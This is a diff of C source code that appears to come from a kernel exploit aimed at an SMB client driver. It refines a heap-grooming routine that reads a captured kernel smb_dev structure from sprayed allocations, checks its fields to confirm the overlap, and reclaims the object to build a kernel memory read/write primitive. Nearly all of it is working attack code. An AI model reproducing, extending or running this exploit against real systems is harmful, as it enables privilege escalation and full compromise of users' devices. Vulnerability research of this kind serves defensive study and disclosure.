@@ -31,6 +31,7 @@ static_assert(sizeof(struct smb_dev) == 48, "");
 
 #define NUM_DBF_CAPTURE_ALLOCS       256
 #define NUM_SMB_DEV_CAPTURE_ALLOCS   512
+#define NUM_SMB_DEV_RECAPTURE_ALLOCS 512
 
 
 static const struct sockaddr_in6 SMB_DEV_CAPTURE_DATA = {
@@ -153,14 +154,34 @@ struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_
         return NULL;
     }
     
-    struct smb_dev_rw* capture_dev = malloc(sizeof(struct smb_dev_rw));
-    bzero(capture_dev, sizeof(struct smb_dev_rw));
-    capture_dev->smb_addr = *smb_addr;
-    capture_dev->fd_rw = kmem_allocator_rw_disown_backend(capture_allocator, (int)capture_idx);
-    capture_dev->fd_dev = -1;
-    capture_dev->rw_data1 = TRUE;
-    capture_dev->session = smb_dev_rw_shared_session_ref(session);
-    capture_dev->active = FALSE;
+    struct smb_dev captured_smb_dev;
+    error = kmem_allocator_rw_read(capture_allocator, (int)capture_idx, (char*)&captured_smb_dev, sizeof(captured_smb_dev), NULL, UINT32_MAX);
+    xe_assert_err(error);
+    
+    struct smb_dev_rw* dev_rw = malloc(sizeof(struct smb_dev_rw));
+    bzero(dev_rw, sizeof(struct smb_dev_rw));
+    dev_rw->smb_addr = *smb_addr;
+    dev_rw->fd_rw = kmem_allocator_rw_disown_backend(capture_allocator, (int)capture_idx);
+    dev_rw->fd_dev = -1;
+    dev_rw->rw_data1 = TRUE;
+    dev_rw->session = smb_dev_rw_shared_session_ref(session);
+    dev_rw->active = FALSE;
+    
+    if (captured_smb_dev.sd_rwlock.opaque[0] != 0x420000 || captured_smb_dev.sd_rwlock.opaque[1] != 0) {
+        return dev_rw;
+    }
+    
+    if (!xe_vm_kernel_address_valid((uintptr_t)captured_smb_dev.sd_devfs)) {
+        return dev_rw;
+    }
+    
+    if (captured_smb_dev.sd_session != NULL || captured_smb_dev.sd_share != NULL) {
+        return dev_rw;
+    }
+    
+    if (captured_smb_dev.sd_flags != NSMBFL_OPEN) {
+        return dev_rw;
+    }
     
     for (int i=0; i<NUM_SMB_DEV_CAPTURE_ALLOCS; i++) {
         if (capture_smb_devs[i] < 0) {
@@ -171,26 +192,24 @@ struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_
         xe_assert_err(error);
         
         struct smb_dev smb_dev;
-        error = smb_client_ioc_auth_info(capture_dev->fd_rw, (char*)&smb_dev, 48, NULL, UINT32_MAX, NULL);
+        error = smb_client_ioc_auth_info(dev_rw->fd_rw, (char*)&smb_dev, 48, NULL, UINT32_MAX, NULL);
         xe_assert_err(error);
         
         if (smb_dev.sd_flags & NSMBFL_CANCEL) {
-            capture_dev->fd_dev = capture_smb_devs[i];
-            capture_dev->backup = smb_dev;
+            dev_rw->fd_dev = capture_smb_devs[i];
+            dev_rw->backup = smb_dev;
             capture_smb_devs[i] = -1;
-            capture_dev->active = TRUE;
+            dev_rw->active = TRUE;
             break;
         }
     }
     
-    if (capture_dev->active) {
-        xe_assert(capture_dev->fd_dev >= 0);
-        xe_assert(capture_dev->fd_rw >= 0);
-    } else {
-        xe_log_warn("failed to capture rw_allocator at fd %d with smb_dev", capture_dev->fd_rw);
+    if (dev_rw->active) {
+        xe_assert(dev_rw->fd_dev >= 0);
+        xe_assert(dev_rw->fd_rw >= 0);
     }
     
-    return capture_dev;
+    return dev_rw;
 }
 
 
@@ -335,10 +354,10 @@ int smb_dev_rw_write_data(smb_dev_rw_t dev, struct smb_dev* data) {
     
     xe_log_debug_hexdump(data, sizeof(*data), "writing smb_dev at %d with:", dev->fd_dev);
     
-    kmem_allocator_rw_t capture_allocator = kmem_allocator_rw_create(&dev->smb_addr, NUM_SMB_DEV_CAPTURE_ALLOCS / 2);
+    kmem_allocator_rw_t capture_allocator = kmem_allocator_rw_create(&dev->smb_addr, NUM_SMB_DEV_RECAPTURE_ALLOCS / 2);
     close(dev->fd_rw);
     
-    int error = kmem_allocator_rw_allocate(capture_allocator, NUM_SMB_DEV_CAPTURE_ALLOCS / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
+    int error = kmem_allocator_rw_allocate(capture_allocator, NUM_SMB_DEV_RECAPTURE_ALLOCS / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
         *data1 = (char*)data;
         *data1_size = 48;
         *data2 = (char*)data;
